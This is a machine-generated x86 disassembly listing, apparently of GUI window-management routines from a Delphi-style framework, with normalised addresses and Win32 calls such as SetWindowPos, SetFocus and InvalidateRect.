je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_3ab6d0c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_3ab6c5c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x1b4 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov dl 0x1
mov eax ebx
call sub_3ac463c
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_3ab0e78
test eax eax
jne r-xdata
sub_3ab6db8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_3ab5334
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_3ab6dd8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
movzx esi [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_3ab5334
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_3ab6e0c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_3ab5334
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_3ab6e2c
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
cmp [ ebx + 0x64 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_3ab90b8
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_3aafaf8
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_3a6a374
mov ebp eax
mov [ ebx + 0x64 ] ebp
mov eax ebp
call sub_3a6a388
mov ecx eax
mov edx ebp
mov eax ebx
call sub_3aafb08
mov eax r-xdata
call sub_3a6a394
mov [ ebx + 0x64 ] eax
jmp r-xdata
sub_3ab6eac
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_3ab6ed0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
movzx edx [ esp ]
mov eax ebp
call sub_3aaebec
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_3ab3ba4
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_3ab3b68
movzx edx [ esp ]
mov si 0xffd0
call sub_3a6457c
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_3ab6f28
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd0
call sub_3a6457c
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_3ab6f4c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd0
call sub_3a6457c
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_3ab6f84
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3ab1e90
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_3ab3c34
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_3ab4518
sub_3ab6fbc
push esi
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax esi
mov si 0xffc1
call sub_3a6457c
pop esi
retn
mov eax esi
call sub_3ab0294
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_3a65730
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_3a65730
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_3ab703c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3ab4c58
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_3ab1fc0
sub_3ab709c
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_3ab472c
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_3ab3920
pop ebx
retn
sub_3ab70f4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_3ab3920
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call EnableWindow
sub_3ab7164
push ebx
mov ebx eax
mov eax ebx
call sub_3ab1d68
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_3ab3c34
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_3a89260
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_3ab0e78
sub_3ab71a0
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_3aae0f8
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_3ab7c38
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_3ab0e78
sub_3ab71e0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_3ab7fd8
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_3ab7c38
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_3ab7220
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_3ab3c34
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov eax [ ebx + 0x1b4 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_3ab7b3c
sub_3ab7260
push ebx
mov ebx eax
cmp [ ebx + 0x1dd ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
movzx edx [ eax + 0x1d9 ]
mov eax ebx
call sub_3ab7e14
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_3ab7e14
jmp r-xdata
mov [ ebx + 0x1dd ] 0x1
sub_3ab72c0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
movzx eax [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_3ab08d0
jmp r-xdata
push 0x0
push 0x0
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax esi
call sub_3aaf6c0
lea edx [ esp + 0x8 ]
xor ecx ecx
mov eax esi
call sub_3ab4a48
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_3ab7348
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3ab1f1c
mov edx esi
mov eax ebx
call sub_3ab3bc4
pop esi
pop ebx
retn
sub_3ab7364
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_3aac66c
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
movzx eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov dl 0x1
mov eax [ esp ]
call sub_3ac463c
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_3a6457c
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffa5
call sub_3a6457c
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffee
call sub_3a6457c
test al al
jne r-xdata
sub_3ab73fc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
movzx edx [ esi + 0x4 ]
mov eax ebx
call sub_3ab8f3c
mov edx esi
mov eax ebx
call sub_3ab7364
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_3ab0e78
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_3ab0e78
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_3ab0e78
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov dl 0x1
mov eax ebx
call sub_3ac463c
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_3ab0e78
test eax eax
jne r-xdata
jmp r-xdata
sub_3ab74e0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
movzx edi [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_3ab0e78
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_3ab7534
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_3ab0e78
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov dl 0x1
mov eax ebx
call sub_3ac463c
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_3ab0e78
test eax eax
jne r-xdata
sub_3ab7584
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_3ab7364
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_3ab0e78
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov dl 0x1
mov eax ebx
call sub_3ac463c
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_3ab0e78
test eax eax
jne r-xdata
sub_3ab75e0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov dl 0x1
mov eax ebx
call sub_3ac463c
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_3ab0e78
mov [ esi + 0xc ] eax
sub_3ab7614
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
mov eax [ ebx + 0x1b4 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_3aaf08c
mov eax ebx
call sub_3ab28e8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_3aaf4a0
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x1b4 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_3ab76f0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_3ab3ba4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_3ab3b68
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_3a6457c
inc edi
dec ebx
jne r-xdata
sub_3ab7738
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_3ab36c0
xor eax eax
push ebp
push sub_3ab77d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3ab76f0
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_3aaf798
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3ab77dd
mov eax [ ebp - 0x4 ]
call sub_3ab36c8
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x8c ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x242 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x242 ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x246 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x246 ] eax
sub_3ab77e4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x1b4 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_3ab3ba4
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x1b4 ]
push eax
call ScrollWindow
mov eax edi
call sub_3ab36e8
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x1b4 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_3ab3b68
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x1b4 ]
push eax
call SetWindowPos
sub_3ab78d4
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x1cc ]
test edx edx
je r-xdata
mov eax [ eax + 0x1d0 ]
mov edx ebx
call sub_3a7a4f0
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x1b4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x1d0 ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x1d0 ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x1b4 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_3a7a388
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x1d0 ]
mov ecx ebx
mov edx esi
call sub_3a7a510
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_3a7a494
call sub_3ab7c38
jmp r-xdata
mov eax ebp
mov edx esi
call sub_3a7a494
call sub_3ab7c38
sub_3ab79ac
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x1b4 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x1d0 ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_3ab78d4
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x1cc ]
test esi esi
je r-xdata
sub_3ab7a0c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_3ab7c38
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_3ab7c38
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x1b4 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
test eax eax
jne r-xdata
sub_3ab7a70
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_3ab0e78
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x1b4 ]
push eax
call InvalidateRect
call sub_3abdd24
call sub_3abde2c
test al al
je r-xdata
mov eax ebx
call sub_3ab3ba4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_3ab3b68
mov edx [ eax ]
call [ edx + 0x80 ]
mov edx esi
mov eax ebx
call sub_3ab3b68
test [ eax + 0x52 ] 0x4
je r-xdata
sub_3ab7b3c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_3aaf4a0
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x1b4 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_3ab7b74
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov dl 0x1
mov eax ebx
call sub_3ac463c
mov esi eax
test esi esi
je r-xdata
movzx eax [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_3ab7bb4
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_3ac463c
test eax eax
je r-xdata
cmp [ ebx + 0x1c4 ] 0x0
je r-xdata
mov edx ebx
call sub_3ac96bc
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_3ac464c
mov eax ebx
call sub_3ab7c38
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_3ab7bf0
push ebx
mov ebx eax
cmp [ ebx + 0x1b4 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x1b4 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_3ab7c14
push ebx
mov ebx eax
cmp [ ebx + 0x1b4 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x98 ]
call sub_3ab7c14
sub_3ab7c4c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov [ esp ] eax
push 0x0
push esi
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_3a78e1c
mov eax [ esp ]
call sub_3ab3ba4
mov edi eax
dec edi
test edi edi
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
mov [ esp + 0x4 ] 0x0
xor edx edx
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp eax [ esi ]
jge r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx 0x1
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp eax [ esi + 0x4 ]
jge r-xdata
xor edx edx
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi ] eax
inc [ esp + 0x4 ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
xor edx edx
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebp eax
mov edx 0x2
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebp eax
cmp ebp [ esi + 0x8 ]
jle r-xdata
mov edx 0x1
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ esi + 0x4 ] eax
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_3ab3b68
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
mov edx 0x1
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebp eax
mov edx 0x3
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebp eax
cmp ebp [ esi + 0xc ]
jle r-xdata
xor edx edx
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebp eax
mov edx 0x2
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebp eax
mov [ esi + 0x8 ] ebp
mov edx 0x1
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebp eax
mov edx 0x3
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebp eax
mov [ esi + 0xc ] ebp
sub_3ab7d80
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_3ab7c38
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_3ab7db8
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_3ab7fd8
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_3ab7c38
push eax
call SetWindowPos
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
sub_3ab7e70
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x1c8 ]
mov edx ebx
call sub_3a7a4f0
pop esi
pop ebx
retn
sub_3ab7e94
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_3ab7e70
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x1c8 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_3a7a388
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x1c8 ]
mov ecx ebx
call sub_3a7a510
sub_3ab7f08
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1d8 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1d8 ] bl
mov eax esi
call sub_3ab7fd8
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_3ab0e78
push 0xfffffff0
mov eax [ esi + 0x1b4 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x1b4 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_3ab7f68
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_3ab7fcc
